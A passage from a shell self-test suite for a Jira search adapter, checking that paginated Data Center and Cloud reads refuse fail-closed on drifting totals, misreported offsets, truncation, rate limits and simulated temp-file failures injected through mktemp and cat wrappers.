  if [ "$m5_rc" -eq 2 ] && [ ! -s "$tmpd/m5.out" ] && [ "$m5_reqs" -eq 1 ]; then
    echo "PASS: selftest — Data Center: an empty page making no progress (total > startAt, zero issues) refuses on the FIRST such page, rc 2, empty stdout, one real request (T2b2 fix1 m-5)"
  else
    echo "FAIL: selftest — Data Center: an empty no-progress page was not refused on the first occurrence (rc=$m5_rc reqs=$m5_reqs out='$(cat "$tmpd/m5.out" 2>/dev/null)' err='$(cat "$tmpd/m5.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T2b2 fix2 Q-m5 (design hardening): a Data Center `total` that CHANGES between pages of the
  # SAME read — page 1 (startAt 0, 3 issues, total 5) then page 2 (startAt 3, 1 issue, total 4,
  # coherent WITH ITSELF: next=3+1=4==4) — must refuse (rc 2, "list changed during the read")
  # rather than accept page 2's own total at face value and report "done" with only 4 of the
  # original 5 issues, silently skipping the 5th one no page ever returned. ------------------------
  _tj_fxseq dc-list-page1-total-drift dc-list-page2-total-drift
  : > "$argvlog"
  qm5_rc=0
  _tj_search_all datacenter AB "https://ex.example.com/rest/api/2/search" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/qm5.out" 2>"$tmpd/qm5.err" || qm5_rc=$?
  qm5_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  if [ "$qm5_rc" -eq 2 ] && [ ! -s "$tmpd/qm5.out" ] && [ "$qm5_reqs" -eq 2 ] \
    && grep -q "list changed during the read" "$tmpd/qm5.err"; then
    echo "PASS: selftest — Data Center: a 'total' that changes between pages (5 then 4) refuses, rc 2, empty stdout, 2 real requests, never a silently-skipped issue (T2b2 fix2 Q-m5)"
  else
    echo "FAIL: selftest — Data Center: a 'total' that changed between pages was not refused (rc=$qm5_rc reqs=$qm5_reqs out='$(cat "$tmpd/qm5.out" 2>/dev/null)' err='$(cat "$tmpd/qm5.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T2b2 fix3 F-1 (Important — the drift check fails open when its own state file cannot be
  # written/read): `_tj_sa_total_drift_ok`'s `cat`/`printf >` failures were either swallowed by
  # `|| true` or followed by an unconditional `return 0` — so a drift-state file that cannot be used
  # AT ALL (not merely "empty") made page 2 of a drift-checked read look identical to page 1: rc 0,
  # only 4 of the 5 real issues, the drift never caught. A DIRECTORY (not a chmod'd file — root
  # ignores permission bits) is the one state no caller can ever successfully `cat`/write through,
  # on any user. Shadow `mktemp` for exactly ONE call — the run's 3rd (`_sa_totaltrack`, the drift
  # state file; calls 1/2 are `_sa_buf`/`_sa_bftrack`) — with a stand-in that hands back a freshly
  # made directory instead of a file; every other call still gets a real file from the real
  # `mktemp`. T2c0 item 4: `_TJ_RUNDIR` (T2c0's own new run-directory call) is now call #1, so the
  # drift state file (`_sa_totaltrack`) shifts from call #3 to call #4 — every OTHER call's own
  # `"$@"` is now forwarded (never ignored), since a `-d`/templated call must reach the real
  # `mktemp` unmodified for `_TJ_RUNDIR`/`_tj_mktemp`'s own mechanism to keep working. -------------
  f1_mktcount="$tmpd/.f1-mktcount"
  : > "$f1_mktcount"
  mktemp() {
    _f1n=$(cat "$f1_mktcount" 2>/dev/null || echo 0)
    _f1n=$((_f1n + 1))
    printf '%s' "$_f1n" > "$f1_mktcount"
    if [ "$_f1n" -eq 4 ]; then
      # T2b2 fix4 (carried hygiene, T2b2 fix3 security seat Low): an explicit template under this
      # RUN's own scratch dir — a bare `mktemp -d` ignores `TMPDIR` on macOS, so without one this
      # directory leaked into the real system temp dir on every run instead of `$tmpd` (cleaned up
      # by `_tj_selftest`'s own `rm -rf "$tmpd"`).
      command mktemp -d "$tmpd/f1dir.XXXXXX"
    else
      command mktemp "$@"
    fi
  }
  _tj_fxseq dc-list-page1-total-drift dc-list-page2-total-drift
  : > "$argvlog"
  f1_rc=0
  _tj_search_all datacenter AB "https://ex.example.com/rest/api/2/search" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/f1.out" 2>"$tmpd/f1.err" || f1_rc=$?
  unset -f mktemp
  f1_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  f1_stderrok=1
  grep -qiE "cannot create|permission denied|is a directory" "$tmpd/f1.err" && f1_stderrok=0
  if [ "$f1_rc" -eq 2 ] && [ ! -s "$tmpd/f1.out" ] && [ "$f1_reqs" -eq 1 ] && [ "$f1_stderrok" -eq 1 ]; then
    echo "PASS: selftest — the drift-check state file failing to write/read (handed a directory instead of a file, root-proof unlike a chmod'd file) refuses fail-closed, rc 2, empty stdout, one real request, no leaked filesystem diagnostic (T2b2 fix3 F-1)"
  else
    echo "FAIL: selftest — the drift-check state file failing to write/read was not refused cleanly (rc=$f1_rc reqs=$f1_reqs stderrok=$f1_stderrok out='$(cat "$tmpd/f1.out" 2>/dev/null)' err='$(cat "$tmpd/f1.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T2b2 fix3 F-1b (isolates the WRITE branch's own `|| return 1` — the F-1 leg above always
  # takes the CAT/compare branch, since a directory satisfies `[ -s ... ]` TRUE on every page, so it
  # can never exercise this half): a totaltrack path whose PARENT DIRECTORY does not exist satisfies
  # `[ -s ... ]` FALSE (no file yet) — reaching the WRITE branch — and the write itself then fails
  # ("No such file or directory"). Must refuse (rc 2) rather than silently proceed to a second page,
  # and must not leak the raw diagnostic. --------------------------------------------------------
  f1b_mktcount="$tmpd/.f1b-mktcount"
  : > "$f1b_mktcount"
  mktemp() {
    _f1bn=$(cat "$f1b_mktcount" 2>/dev/null || echo 0)
    _f1bn=$((_f1bn + 1))
    printf '%s' "$_f1bn" > "$f1b_mktcount"
    # T2c0 item 4: shifted from call #3 to #4 (see the F-1 leg's own comment above) — the
    # drift-state file is now `_sa_totaltrack`, still the run's 4th mktemp call.
    if [ "$_f1bn" -eq 4 ]; then
      printf '%s/f1b-missing-dir/totaltrack' "$tmpd"
    else
      command mktemp "$@"
    fi
  }
  _tj_fxseq dc-list-page1-total-drift dc-list-page2-total-drift
  : > "$argvlog"
  f1b_rc=0
  _tj_search_all datacenter AB "https://ex.example.com/rest/api/2/search" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/f1b.out" 2>"$tmpd/f1b.err" || f1b_rc=$?
  unset -f mktemp
  f1b_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  f1b_stderrok=1
  grep -qiE "no such file|cannot create|permission denied|is a directory" "$tmpd/f1b.err" && f1b_stderrok=0
  if [ "$f1b_rc" -eq 2 ] && [ ! -s "$tmpd/f1b.out" ] && [ "$f1b_reqs" -eq 1 ] && [ "$f1b_stderrok" -eq 1 ]; then
    echo "PASS: selftest — the drift-check state file's WRITE branch failing (a path whose parent directory does not exist) also refuses fail-closed, rc 2, empty stdout, one real request, no leaked filesystem diagnostic (T2b2 fix3 F-1b)"
  else
    echo "FAIL: selftest — the drift-check WRITE branch failing was not refused cleanly (rc=$f1b_rc reqs=$f1b_reqs stderrok=$f1b_stderrok out='$(cat "$tmpd/f1b.out" 2>/dev/null)' err='$(cat "$tmpd/f1b.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T2b2 fix3 F-3 (quality m-1 — `floor|tostring` normalisation untested): a DC `total` spelled
  # with a zero fraction (3.0) is a genuine, INTEGRAL JSON number — the typed check in
  # `_tj_sa_page_status_dc` already accepts it, and `.total|floor|tostring` is what turns it into the
  # plain digit string "3" the completeness arithmetic and the shell `[` builtin can use. A page with
  # exactly 3 real issues at `startAt 0` against `total: 3.0` must therefore ACCEPT (rc 0, all 3
  # keys) — the normalisation is the intended behaviour, not merely a refusal-side defence. ----------
  _tj_fx dc-list-total-3dot0
  : > "$argvlog"
  f3_rc=0
  _tj_search_all datacenter AB "https://ex.example.com/rest/api/2/search" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/f3.out" 2>"$tmpd/f3.err" || f3_rc=$?
  f3_keys=$(jq -r '.key' < "$tmpd/f3.out" 2>/dev/null | tr '\n' ',')
  if [ "$f3_rc" -eq 0 ] && [ "$f3_keys" = "AB-1,AB-2,AB-3," ]; then
    echo "PASS: selftest — Data Center 'total: 3.0' (a zero-fraction, genuinely integral number) is accepted, rc 0, all 3 keys — the floor|tostring normalisation is load-bearing on the ACCEPT path too (T2b2 fix3 F-3)"
  else
    echo "FAIL: selftest — Data Center 'total: 3.0' was not accepted (rc=$f3_rc keys='$f3_keys' out='$(cat "$tmpd/f3.out" 2>/dev/null)' err='$(cat "$tmpd/f3.err" 2>/dev/null)')"; sfail=1
  fi

}
_tj_st_search_exact_oracle() {

  # --- T2b2 fix5: the EXACT class oracle — fix4's own CLASS oracle sharpened test-first per the
  # MEASURED shell semantics (not fix4's own false ones — see the standalone notes this round
  # rewrote above `_tj_search_all`/`_tj_sa_fetch_page`/`_tj_sa_one_page`/`jira_curl_authed`):
  # entering ANY `$( … )` RE-ARMS errexit on `sh`(bash-3.2-POSIX)/`dash` regardless of the outer
  # `|| rc=$?` state, and a failing redirect is fatal ONLY where errexit actually applies — never a
  # standalone "redirects are always fatal" rule. A PATH-level `mktemp` WRAPPER SCRIPT (never a
  # function shadow — fix4's own root-cause note 3 found a function shadow can lose its own
  # captured output across a fork under `dash`; a real subprocess has no such artifact) drives
  # THIRTEEN fault-injection cases through the SAME real call tree every production caller uses,
  # one call-number-keyed "spec" file per case (a plain shell counter resets on every fork, so the
  # counter itself is a FILE, same technique fix3/fix4 already used). For EVERY case the oracle now
  # asserts: rc == 2 EXACTLY (the SAME rc on sh and dash — no longer merely "nonzero", T2b2 fix4's
  # own "rc differs by shell" defect class is pinned CLOSED, not just improved), stdout empty, no
  # leaked temp FILE (`-type f -name 'real-*'` under this case's own throwaway dir — a fault
  # DIRECTORY/missing-parent/unreadable target this leg manufactures to BREAK a write is a test
  # fixture, never a production temp), and stderr is EXACTLY the case's own single fixed sentence
  # (not merely "none of these raw substrings") — the wrapper's own "fail" action prints a
  # REALISTIC forged `mktemp: mkstemp failed on …` diagnostic before exiting 1, so a guard missing
  # its `2>/dev/null` reds via that leaked raw text, exactly as a real ENOSPC/EACCES would. New this
  # round: `bodywrite` (the request-body write itself fails), `respmktemp`/`hdrmktemp`
  # (`jira_curl_authed`'s own two scratch-file `mktemp`s — `hdrmktemp` also proves `_resp_tmp` is
  # not left behind), and `finaldeliveryonly` (an UNREADABLE, not merely absent, `_sa_buf` — the
  # whole read otherwise succeeds, so ONLY `_tj_sa_run_loop`'s own final `cat` can fail — pinning
  # that ONE guard on BOTH shells without `finalcat`'s own shell-dependent surfacing ambiguity,
  # T2b2 fix4's own root-cause note 4). `finalcat` itself (the caller's stdout closed) is KEPT as a
  # non-regression case; its own surfacing site is measured to differ by shell (`_tj_sa_run_loop`'s
  # final `cat` on one, `jira_curl_authed`'s own delivery `cat` on the other), so its oracle accepts
  # EITHER of those two fixed sentences — never a third, unexpected one. -----------------------------
  f4_base="$tmpd/f4"; mkdir -p "$f4_base"
  f5_bin="$tmpd/bin"; mkdir -p "$f5_bin"
  # T2b2 fix6 (M-4/L-2): resolve the REAL `mktemp`/`cat` from the ORIGINAL PATH, once, before this
  # directory is ever prepended onto PATH below — never a hardcoded `/usr/bin/mktemp` (a real
  # concern only on a distro whose `mktemp`/`cat` live somewhere else; `command -v` finds whatever
  # this environment actually has).
  F5_REAL_MKTEMP=$(command -v mktemp); export F5_REAL_MKTEMP
  F5_REAL_CAT=$(command -v cat); export F5_REAL_CAT
  cat > "$f5_bin/mktemp" <<'FIVEMKEOF'
#!/bin/sh
# T2b2 fix5: the EXACT class oracle's mktemp stand-in — a real executable on PATH, read by every
# fork in the call tree (env vars, unlike shell functions, cross a fork cleanly). $F5_CASEFILE
# names the case currently running; $F5_TMPD is the selftest's own $tmpd. The Nth call this
# PROCESS TREE makes (a per-case counter file, since a plain variable resets on every fork) looks
# up line N of that case's own "spec" file for an action; no line (or an unlisted case) means
# "pass through to real mktemp, faithfully, with an explicit per-case template" (a bare mktemp
# ignores TMPDIR on macOS without one, which would hide a real leak in the system temp dir).
cf=$(cat "$F5_CASEFILE" 2>/dev/null) || cf=""
d="$F5_TMPD/f4/$cf"
# T2c0 item 4 (the 'rundir' case): a bare `mktemp -d` (no template) is the read's own private
# run-directory call — tracked on ITS OWN check, never the numbered sequence below (every other
# call here always supplies an explicit template), so adding it never renumbers any existing case.
if [ $# -eq 1 ] && [ "$1" = "-d" ]; then
  if [ "$cf" = "rundir" ]; then
    printf 'mktemp: mkdtemp failed on %s/tmp.abc: No such file or directory\n' "$d" >&2
    exit 1
  fi
  exec "$F5_REAL_MKTEMP" -d "$d/rundir.XXXXXX"
fi
mkn="$F5_TMPD/.f4-mkn-$cf"
n=$(cat "$mkn" 2>/dev/null || echo 0); n=$((n + 1)); printf '%s' "$n" > "$mkn"
act=$(sed -n "${n}p" "$F5_TMPD/.f4-spec-$cf" 2>/dev/null)
case "$act" in
  fail)
    printf 'mktemp: mkstemp failed on %s/tmp.abc: No such file or directory\n' "$d" >&2
    exit 1 ;;
  dir)
    exec "$F5_REAL_MKTEMP" -d "$d/fault.XXXXXX" ;;
  missing)
    printf '%s/missing/target\n' "$d" ;;
  unreadable)
    # T2b2 fix6 (R-1: root-safe fault): NOT `chmod 200` — root ignores a permission bit, so that
    # fault reds under an unprivileged user and silently PASSES as root, without the guard it is
    # meant to exercise ever actually running. Instead this creates a REAL, normally-readable file
    # whose NAME carries the `.catfail.` marker the `cat` wrapper below (not a permission bit)
    # checks — a name check works identically for every uid, root included.
    # T2c0 item 4: nest under the CALLER's own directory (typically inside `_TJ_RUNDIR` now), same
    # reason as the default arm below — so `rm -rf "$_TJ_RUNDIR"` still finds and removes this file.
    _f5_udir=$d
    [ $# -ge 1 ] && _f5_udir=$(dirname "$1")
    f=$("$F5_REAL_MKTEMP" "$_f5_udir/real-$n.catfail.XXXXXX") || exit 1
    printf '%s\n' "$f" ;;
  *)
    # T2c0 item 4: every OTHER call now supplies an explicit template (`_tj_mktemp`'s own
    # `$_TJ_RUNDIR/<suffix>.XXXXXX`) — keep the CALLER's own directory (so cleanup via
    # `rm -rf "$_TJ_RUNDIR"` still finds it) but override the basename to the oracle's own `real-*`
    # naming, so the leak check below keeps finding every temp regardless of the caller's own name.
    if [ $# -ge 1 ]; then
      _f5_dir=$(dirname "$1")
      exec "$F5_REAL_MKTEMP" "$_f5_dir/real-$n.XXXXXX"
    fi
    exec "$F5_REAL_MKTEMP" "$d/real-$n.XXXXXX" ;;
esac
FIVEMKEOF
  chmod +x "$f5_bin/mktemp"
  cat > "$f5_bin/cat" <<'FIVECATEOF'
#!/bin/sh
# T2b2 fix6 (R-1: the root-safe fault's OTHER half): a PATH-level `cat` wrapper, same technique as
# the `mktemp` wrapper above. It faults by NAME, never by permission bit, so the fault it drives
# behaves identically for an unprivileged user and for root — an operand carrying the `.catfail.`
# marker ANYWHERE IN THE ARGUMENT (T2b2 fix7 wording correction — the `case *.catfail.*)` glob
# matches the whole operand, not just its basename component; assigned only by the `mktemp`
# wrapper's own `unreadable` action above) gets a
# realistic raw diagnostic and exit 1; every OTHER operand (every fixture read, every legitimate
# `cat` call this selftest already makes) passes straight through to the REAL `cat`, resolved via
# `command -v cat` BEFORE this directory was ever prepended onto PATH — so there is no self-
# recursion, and no behaviour change for any call that does not name a `.catfail.` file.
for _f5c_arg in "$@"; do
  case "$_f5c_arg" in
    *.catfail.*)
      printf 'cat: %s: Permission denied\n' "$_f5c_arg" >&2
      exit 1 ;;
  esac
done
exec "$F5_REAL_CAT" "$@"
FIVECATEOF
  chmod +x "$f5_bin/cat"
  F5_CASEFILE="$tmpd/.f5case"; export F5_CASEFILE
  F5_TMPD="$tmpd"; export F5_TMPD
  f5_origpath=$PATH
  PATH="$f5_bin:$PATH"; export PATH
  for f4_case in rundir mktemp1 mktemp2 mktemp3 fetchmktemp respmktemp hdrmktemp bodywrite trackwrite \
    bufappend driftread driftwrite finalcat finaldeliveryonly respdelivery; do
    f4_dir="$f4_base/$f4_case"; mkdir -p "$f4_dir"
    printf '%s' "$f4_case" > "$F5_CASEFILE"
    printf '%s' 0 > "$tmpd/.f4-mkn-$f4_case"
    case "$f4_case" in
      mktemp1)            printf 'fail\n' > "$tmpd/.f4-spec-$f4_case" ;;
      mktemp2)            printf '\nfail\n' > "$tmpd/.f4-spec-$f4_case" ;;
      mktemp3)             printf '\n\nfail\n' > "$tmpd/.f4-spec-$f4_case" ;;
      fetchmktemp)         printf '\n\n\nfail\n' > "$tmpd/.f4-spec-$f4_case" ;;
      respmktemp)          printf '\n\n\n\nfail\n' > "$tmpd/.f4-spec-$f4_case" ;;
      hdrmktemp)           printf '\n\n\n\n\nfail\n' > "$tmpd/.f4-spec-$f4_case" ;;
      bodywrite)           printf '\n\n\nmissing\n' > "$tmpd/.f4-spec-$f4_case" ;;
      trackwrite)          printf '\ndir\n' > "$tmpd/.f4-spec-$f4_case" ;;
      bufappend)           printf 'dir\n' > "$tmpd/.f4-spec-$f4_case" ;;
      driftread)           printf '\n\ndir\n' > "$tmpd/.f4-spec-$f4_case" ;;
      driftwrite)          printf '\n\nmissing\n' > "$tmpd/.f4-spec-$f4_case" ;;
      finalcat)            printf '' > "$tmpd/.f4-spec-$f4_case" ;;
      finaldeliveryonly)   printf 'unreadable\n' > "$tmpd/.f4-spec-$f4_case" ;;
      respdelivery)        printf '\n\n\n\nunreadable\n' > "$tmpd/.f4-spec-$f4_case" ;;
    esac
    case "$f4_case" in
      driftread|driftwrite) _tj_fxseq dc-list-page1-total-drift dc-list-page2-total-drift ;;
      *) _tj_fx dc-list-total-3dot0 ;;
    esac
    : > "$argvlog"
    f4_rc=0
    if [ "$f4_case" = finalcat ]; then
      _tj_search_all datacenter AB "https://ex.example.com/rest/api/2/search" \
        "project = AB AND status = 3" 200 '["key"]' >&- 2>"$tmpd/f4-$f4_case.err" || f4_rc=$?
      : > "$tmpd/f4-$f4_case.out"
    else
      _tj_search_all datacenter AB "https://ex.example.com/rest/api/2/search" \
        "project = AB AND status = 3" 200 '["key"]' >"$tmpd/f4-$f4_case.out" 2>"$tmpd/f4-$f4_case.err" || f4_rc=$?
    fi
    f4_reqs=$(wc -l < "$argvlog" | tr -d ' ')
    f4_leak=$(find "$f4_dir" -mindepth 1 -type f -name 'real-*' 2>/dev/null | wc -l | tr -d ' ')
    # T2b2 fix6 (M-2): the WHOLE file, byte-for-byte, not `wc -l` (a newline count) + `sed -n '1p'`
    # (the first line only) — a defect that appends a SECOND fragment onto the same guard's stderr
    # with no newline of its own passes both of the old checks (one newline total, and the first
    # line — everything up to that one newline — still equals the expected sentence exactly) while
    # visibly leaking extra bytes. `$(...)` strips only TRAILING newlines, so an embedded fragment
    # survives into `f4_errwhole` and fails the whole-file comparison; the separate byte count below
    # closes the residual case where a mutant's extra bytes happen to already be un-capturable by a
    # plain string compare (e.g. a NUL byte truncating the shell's own string read).
    f4_errbytes=$(wc -c < "$tmpd/f4-$f4_case.err" | tr -d ' ')
    f4_errwhole=$(cat "$tmpd/f4-$f4_case.err" 2>/dev/null)
    case "$f4_case" in
      rundir|mktemp1|mktemp2|mktemp3|fetchmktemp|respmktemp|hdrmktemp|bodywrite|trackwrite) f4_expreqs=0 ;;
      bufappend|driftread|driftwrite|finalcat|finaldeliveryonly|respdelivery) f4_expreqs=1 ;;
    esac
    # T2b2 fix4's own lesson, re-applied: for every case whose OWN injected fault IS a `mktemp`
    # call itself failing outright, assert the call counter stopped EXACTLY there — never a later
    # call — so a mutant caught by a LATER, unrelated guard reds for the WRONG reason. Load-bearing
    # here specifically because these six sites share ONE fixed sentence ("could not create a
    # scratch file") — the sentence alone cannot tell them apart; the stopped-call-number can.
    f4_mktexp=""
    case "$f4_case" in
      mktemp1) f4_mktexp=1 ;;
      mktemp2) f4_mktexp=2 ;;
      mktemp3) f4_mktexp=3 ;;
      fetchmktemp) f4_mktexp=4 ;;
      respmktemp) f4_mktexp=5 ;;
      hdrmktemp) f4_mktexp=6 ;;
    esac
    f4_mktok=1
    if [ -n "$f4_mktexp" ]; then
      f4_mktseen=$(cat "$tmpd/.f4-mkn-$f4_case" 2>/dev/null || echo 0)
      [ "$f4_mktseen" -eq "$f4_mktexp" ] || f4_mktok=0
    fi
    f4_errmatch=0
    case "$f4_case" in
      finalcat)
        for f4_cand in "unverified: could not deliver the list" \
          "unverified: could not deliver the jira response"; do
          f4_candbytes=$(printf '%s\n' "$f4_cand" | wc -c | tr -d ' ')
          if [ "$f4_errwhole" = "$f4_cand" ] && [ "$f4_errbytes" -eq "$f4_candbytes" ]; then
            f4_errmatch=1
          fi
        done ;;
      *)
        f4_experr="unverified: could not create a scratch file"
        case "$f4_case" in
          bodywrite) f4_experr="unverified: could not write the request body" ;;
          trackwrite) f4_experr="unverified: could not write the tracking file" ;;
          bufappend) f4_experr="unverified: search response could not be buffered" ;;
          driftread|driftwrite) f4_experr="unverified: list changed during the read" ;;
          finaldeliveryonly) f4_experr="unverified: could not deliver the list" ;;
          respdelivery) f4_experr="unverified: could not deliver the jira response" ;;
        esac
        f4_expbytes=$(printf '%s\n' "$f4_experr" | wc -c | tr -d ' ')
        if [ "$f4_errwhole" = "$f4_experr" ] && [ "$f4_errbytes" -eq "$f4_expbytes" ]; then
          f4_errmatch=1
        fi ;;
    esac
    if [ "$f4_rc" -eq 2 ] && [ ! -s "$tmpd/f4-$f4_case.out" ] && [ "$f4_leak" -eq 0 ] \
      && [ "$f4_reqs" -eq "$f4_expreqs" ] && [ "$f4_mktok" -eq 1 ] \
      && [ "$f4_errmatch" -eq 1 ]; then
      echo "PASS: selftest — T2b2 fix5 EXACT class oracle case '$f4_case' refuses fail-closed, rc 2, empty stdout, $f4_reqs request(s) (expected $f4_expreqs), no leaked temp file, stderr exactly '$f4_errwhole' ($f4_errbytes bytes) (T2b2 fix5/fix6)"
    else
      echo "FAIL: selftest — T2b2 fix5 EXACT class oracle case '$f4_case' (rc=$f4_rc reqs=$f4_reqs/$f4_expreqs leak=$f4_leak mktok=$f4_mktok errbytes=$f4_errbytes errmatch=$f4_errmatch out='$(cat "$tmpd/f4-$f4_case.out" 2>/dev/null)' err='$(tr '\n' '|' < "$tmpd/f4-$f4_case.err" 2>/dev/null)')"; sfail=1
    fi
  done
  PATH=$f5_origpath; export PATH

}
_tj_st_search_dc_tail() {

  # --- T2b2 DC leg 3 (T2b2 fix2 Q-m3: rewritten so the mutant's own OUTPUT is visibly wrong, not
  # merely a different request count): a response LYING about its own `startAt` (both pages claim
  # "startAt": 4) -> the adapter must use ITS OWN requested startAt (0, then 1 — never the
  # response's 4) for the completeness arithmetic. CORRECT arithmetic: page 1 next=0+1=1 <5(total)
  # -> next page; page 2 next=1+4=5==5(total) -> done, all 5 keys, rc 0, 2 real requests. The "use
  # the response's own startAt" MUTANT instead computes page 1's next as 4(the lie)+1=5==5(total)
  # -> WRONGLY "done" after page 1 ALONE — rc 0 but only 1 of the 5 keys, page 2 NEVER requested —
  # a silently truncated list mistaken for a complete one, not just a different rc/request count. ---
  _tj_fxseq dc-list-page1-lying-startat dc-list-page2-lying-startat
  : > "$argvlog"
  dc3_rc=0
  _tj_search_all datacenter AB "https://ex.example.com/rest/api/2/search" \
    "project = AB AND status = 3" 10 '["key"]' > "$tmpd/dc3.out" 2>"$tmpd/dc3.err" || dc3_rc=$?
  dc3_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  dc3_keys=$(jq -r '.key' < "$tmpd/dc3.out" 2>/dev/null | tr '\n' ',')
  if [ "$dc3_rc" -eq 0 ] && [ "$dc3_keys" = "AB-1,AB-2,AB-3,AB-4,AB-5," ] && [ "$dc3_reqs" -eq 2 ]; then
    echo "PASS: selftest — a Data Center response lying about its own startAt is never trusted — the adapter's own requested-startAt arithmetic drives completeness, all 5 keys, rc 0, 2 real requests (T2b2 DC leg 3)"
  else
    echo "FAIL: selftest — a lying startAt was not handled via the adapter's own arithmetic (rc=$dc3_rc reqs=$dc3_reqs keys='$dc3_keys' out='$(cat "$tmpd/dc3.out" 2>/dev/null)' err='$(cat "$tmpd/dc3.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T2b2 DC leg 4: an HONEST server whose `startAt + len(issues) < total` at the page budget's
  # end -> rc 2 (never a silent short list). dc-list-page1-bigtotal (0+3=3) / -page2-bigtotal
  # (3+2=5), total 99 — never complete within a 2-page budget (cap=10). --------------------------
  _tj_fxseq dc-list-page1-bigtotal dc-list-page2-bigtotal
  : > "$argvlog"
  dc4_rc=0
  _tj_search_all datacenter AB "https://ex.example.com/rest/api/2/search" \
    "project = AB AND status = 3" 10 '["key"]' > "$tmpd/dc4.out" 2>"$tmpd/dc4.err" || dc4_rc=$?
  dc4_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  if [ "$dc4_rc" -eq 2 ] && [ ! -s "$tmpd/dc4.out" ] && [ "$dc4_reqs" -eq 2 ]; then
    echo "PASS: selftest — startAt+len(issues) < total at page-budget exhaustion refuses, rc 2, empty stdout, 2 real requests (T2b2 DC leg 4)"
  else
    echo "FAIL: selftest — a genuinely-truncated DC list was not refused at budget end (rc=$dc4_rc reqs=$dc4_reqs out='$(cat "$tmpd/dc4.out" 2>/dev/null)' err='$(cat "$tmpd/dc4.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T2b2 DC leg 5: ids reach the cap EXACTLY on a complete DC page -> rc 2 (even though the
  # page IS complete by its own arithmetic, 0+3>=3); cap one HIGHER than the total -> rc 0. ---------
  _tj_fx dc-list-cap-exact
  : > "$argvlog"
  dc5a_rc=0
  _tj_search_all datacenter AB "https://ex.example.com/rest/api/2/search" \
    "project = AB AND status = 3" 3 '["key"]' > "$tmpd/dc5a.out" 2>"$tmpd/dc5a.err" || dc5a_rc=$?
  dc5a_ok=0
  [ "$dc5a_rc" -eq 2 ] && [ ! -s "$tmpd/dc5a.out" ] && dc5a_ok=1
  _tj_fx dc-list-cap-exact
  : > "$argvlog"
  dc5b_rc=0
  _tj_search_all datacenter AB "https://ex.example.com/rest/api/2/search" \
    "project = AB AND status = 3" 4 '["key"]' > "$tmpd/dc5b.out" 2>"$tmpd/dc5b.err" || dc5b_rc=$?
  dc5b_ok=0
  [ "$dc5b_rc" -eq 0 ] && [ "$(wc -l < "$tmpd/dc5b.out" | tr -d ' ')" -eq 3 ] && dc5b_ok=1
  if [ "$dc5a_ok" -eq 1 ] && [ "$dc5b_ok" -eq 1 ]; then
    echo "PASS: selftest — Data Center: ids reach the cap exactly on a complete page refuses (rc 2); cap one higher succeeds (rc 0) (T2b2 DC leg 5)"
  else
    echo "FAIL: selftest — Data Center cap-exact truncation did not behave as expected (cap=3 rc=$dc5a_rc out='$(cat "$tmpd/dc5a.out" 2>/dev/null)'; cap=4 rc=$dc5b_rc out='$(cat "$tmpd/dc5b.out" 2>/dev/null)')"; sfail=1
  fi

  # --- T2b2 DC leg 6: the SHARED checks hold on DC too — (a) a cross-project key -> rc 1; (b) a
  # page larger than the requested maxResults -> rc 2; (c) a 429 on page 2 -> rc 2, empty. ----------
  _tj_fx dc-list-crossproject
  : > "$argvlog"
  dc6a_rc=0
  _tj_search_all datacenter AB "https://ex.example.com/rest/api/2/search" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/dc6a.out" 2>"$tmpd/dc6a.err" || dc6a_rc=$?
  dc6a_ok=0
  [ "$dc6a_rc" -eq 1 ] && [ ! -s "$tmpd/dc6a.out" ] && dc6a_ok=1

  _tj_fx dc-list-page1
  : > "$argvlog"
  dc6b_rc=0
  _tj_search_all datacenter AB "https://ex.example.com/rest/api/2/search" \
    "project = AB AND status = 3" 2 '["key"]' > "$tmpd/dc6b.out" 2>"$tmpd/dc6b.err" || dc6b_rc=$?
  dc6b_ok=0
  [ "$dc6b_rc" -eq 2 ] && [ ! -s "$tmpd/dc6b.out" ] && dc6b_ok=1

  _tj_fxseq dc-list-page1 rate-limited
  : > "$argvlog"
  dc6c_rc=0
  _tj_search_all datacenter AB "https://ex.example.com/rest/api/2/search" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/dc6c.out" 2>"$tmpd/dc6c.err" || dc6c_rc=$?
  dc6c_ok=0
  [ "$dc6c_rc" -eq 2 ] && [ ! -s "$tmpd/dc6c.out" ] && dc6c_ok=1

  if [ "$dc6a_ok" -eq 1 ] && [ "$dc6b_ok" -eq 1 ] && [ "$dc6c_ok" -eq 1 ]; then
    echo "PASS: selftest — Data Center: cross-project key refuses (rc 1); an over-sized page refuses (rc 2); a 429 on page 2 refuses (rc 2 empty) — the shared checks hold on DC (T2b2 DC leg 6)"
  else
    echo "FAIL: selftest — a shared check did not hold on Data Center (crossproject rc=$dc6a_rc out='$(cat "$tmpd/dc6a.out" 2>/dev/null)'; over-max rc=$dc6b_rc out='$(cat "$tmpd/dc6b.out" 2>/dev/null)'; 429-p2 rc=$dc6c_rc out='$(cat "$tmpd/dc6c.out" 2>/dev/null)')"; sfail=1
  fi

  if [ "$leg11ok" -eq 1 ]; then
    echo "PASS: selftest — a bad cap (0/007/123456) or a bad project (ab/../x) refuses, rc 1, before any request (T2b1 leg 11)"
  else
    echo "FAIL: selftest — a bad cap or bad project was not cleanly refused pre-request (T2b1 leg 11)"; sfail=1
  fi

  # --- T2c0 item 1 (T2b1 seat M-1): the `fields` allowlist, checked BEFORE any request and before
  # the subshell (invariant 5). ---------------------------------------------------------------------
  fieldsleg_ok=1
  for badfields in '"description"' '["summary"]' '["key"' '[]' '["key\n"]'; do
    _tj_fx list-page1
    : > "$argvlog"
    fl_rc=0
    _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
      "project = AB AND status = 3" 200 "$badfields" > "$tmpd/fl.out" 2>"$tmpd/fl.err" || fl_rc=$?
    fl_err=$(cat "$tmpd/fl.err" 2>/dev/null)
